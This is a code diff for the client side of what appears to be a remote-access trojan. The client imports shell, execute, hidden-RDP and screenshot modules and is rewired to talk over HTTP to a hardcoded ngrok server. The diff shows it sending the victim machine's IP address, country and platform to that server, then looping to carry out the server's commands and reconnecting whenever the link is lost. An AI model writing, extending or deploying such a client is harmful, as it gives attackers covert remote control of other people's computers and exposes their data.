@@ -1,70 +1,64 @@
-import socket
 from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot
 from time import sleep
 import urllib.request
 from ast import literal_eval
 from platform import platform
 from zlib import compress, decompress
+import requests
 
-BUFFER_SIZE = 1024
+SERVER_ADDRESS = "https://3965-121-200-4-145.ngrok-free.app"  # Replace with the ngrok URL obtained after running ngrok
+#SERVER_ADDRESS = "http://localhost:8000" #test
 RECONNECT_TIMER = 5
-SERVER_ADDRESS = 'https://d51a-121-200-4-145.ngrok-free.app'  # Replace with the ngrok URL obtained after running ngrok
-
 
 class Client:
-    def __init__(self, ip, port):
+    def __init__(self):
         """
         This will initiate the connection to the server
-        :param ip: ip address of the server
-        :param port: port of the server
         """
-        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client_socket.connect((ip, port))
-        print('Connected successfully to the server')
-
-    def close(self):
-        """ Closes the connection to the server """
-        self.client_socket.close()
+        self.server_address = SERVER_ADDRESS
+        response = requests.get(self.server_address)
+        if response.status_code == 200:
+            print(f"Connected successfully to the server at {self.server_address}")
+        else:
+            print(f"Failed to connect to the server at {self.server_address}")
 
     def send(self, message):
         """
-        Sends a message in small chunks to the server
-        :param message: Message to send to the server (bytes/str)
+        Sends a message to the server
+        :param message: Message to send to the server (str)
         """
-        message = message.encode() if type(message) != bytes else message
-        message = compress(message, level=6)  # Compress the sent data
-        if len(message) % BUFFER_SIZE == 0:
-            message = message + '.'.encode()
-        while message:
-            self.client_socket.send(message[:BUFFER_SIZE])
-            message = message[BUFFER_SIZE:]
+        url = f"{self.server_address}/send"
+        data = {"message": message}
+        response = requests.post(url, json=data)
+        if response.status_code != 200:
+            print(f"Failed to send message: {response.text}")
 
-    def receive(self, as_bytes=False):
+    def receive(self):
         """
-        Receive a message in small chunks from the Server
-        :param as_bytes: If set to True, this function will return the data as bytes. Default=False
+        Receives a message from the server
+        :return: Message received from the server (str)
         """
-        chunk = self.client_socket.recv(BUFFER_SIZE)
-        data = chunk
-        while len(chunk) == BUFFER_SIZE:
-            chunk = self.client_socket.recv(BUFFER_SIZE)
-            print(chunk)  # Doesn't work without this, I don't know why, and I'm too lazy to fix it
-            if chunk != '.'.encode():
-                data += chunk
-        data = decompress(data)  # Decompress the received data
-        return data if as_bytes else data.decode()
-
+        url = f"{self.server_address}/receive"
+        response = requests.get(url)
+        if response.status_code == 200:
+            message = response.json()['message']
+            if message:
+                return message.split(maxsplit=1)
+            else:
+                return []
+        else:
+            print(f"Failed to receive message: {response.text}")
+            return []
 
 def main():
     """ Connects to the server and send it info about the system """
     try:
-        # Connect to server
-        client = Client(SERVER_ADDRESS, 8000)
-
         # Send client info to the server - IP, Country Code, Name, Os
         response = literal_eval(urllib.request.urlopen('http://ip-api.com/json/?fields=status,countryCode,query').read().decode())
+        print(response)
         if response['status'] == 'success':
-            client.send('{},{},{},{}'.format(response['query'], response['countryCode'], socket.gethostname(), platform()))
+            client = Client()
+            client.send('{},{},{},{}'.format(response['query'], response['countryCode'], requests.get('http://ip.42.pl/raw').text, platform()))
 
             # Respond to server requests
             while True:
@@ -87,7 +81,7 @@ def main():
         else:
             print('Error obtaining client data... Trying to reconnect...')
             sleep(RECONNECT_TIMER * 10)
-    except socket.error:
+    except requests.exceptions.RequestException:
         print('Connection lost... Trying to reconnect...')
         sleep(RECONNECT_TIMER)
         main()
@@ -95,3 +89,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
